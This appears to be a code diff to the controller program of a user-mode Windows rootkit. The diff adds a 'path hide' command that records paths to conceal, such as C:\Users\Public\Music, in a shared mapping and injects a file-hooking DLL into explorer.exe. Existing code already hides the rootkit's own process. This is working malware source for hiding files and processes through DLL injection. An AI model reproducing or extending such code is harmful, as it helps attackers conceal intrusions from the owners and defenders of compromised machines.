@@ -12,6 +12,7 @@ using namespace std;
 
 #define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
 #define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
+#define PATH_DLL "S:\\MalwareDeveloped\\S12URootkit\\fileHooks\\x64\\Release\\fileHooks.dll"
 
 int main(int argc, char* argv[]){        
     unordered_map<string, vector<string>> injectionMap;
@@ -22,13 +23,13 @@ int main(int argc, char* argv[]){
     wstring str1 = L"UserMode-Rootkit.exe";
     processesToHide.push_back((wchar_t*)str1.c_str());
 
-    // File
-    vector<string> filesToHide;
-    string str2 = "UserMode-Rootkit.exe";
-    filesToHide.push_back(str2);
+    // Path
+    vector<wstring> pathsToHide;
+    wstring str2 = L"C:\\Users\\Public\\Music";
+    pathsToHide.push_back(str2);
 
     serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
-    //serialitzator.serializeStringVector(filesToHide, "fileAgentMapped");
+    serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
     
 
     // - rootkit.exe process hide processname.exe
@@ -58,15 +59,20 @@ int main(int argc, char* argv[]){
         injectDlls(injectionMap);
     }
 
-    if (argc == 4 && strcmp(argv[1], "file") == 0 && strcmp(argv[2], "hide") == 0){
+    if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "hide") == 0){
 		// - rootkit.exe file hide filename.exe
-        vector<string> deserializedStrings = serialitzator.deserializeStringVector("fileAgentMapped");
-        string fileName = argv[3];
-        deserializedStrings.push_back(fileName);
-        //serialitzator.serializeStringVector(deserializedStrings, "fileAgentMapped");
+        vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"pathMapped");
+
+        // convert char* to wstring
+        char* path = argv[3];
+        wstring pathW(path, path + strlen(path));
+        deserializedStrings.push_back(pathW);
+        serialitzator.serializeVectorWString(deserializedStrings, L"pathMapped");
+        injectionMap["explorer.exe"] = { PATH_DLL };
+        injectDlls(injectionMap);
 	}
 
-    if (argc == 4 && strcmp(argv[1], "file") == 0 && strcmp(argv[2], "unhide") == 0) {
+    if (argc == 4 && strcmp(argv[1], "path") == 0 && strcmp(argv[2], "unhide") == 0) {
         // - rootkit.exe file unhide filename.exe
     }
     
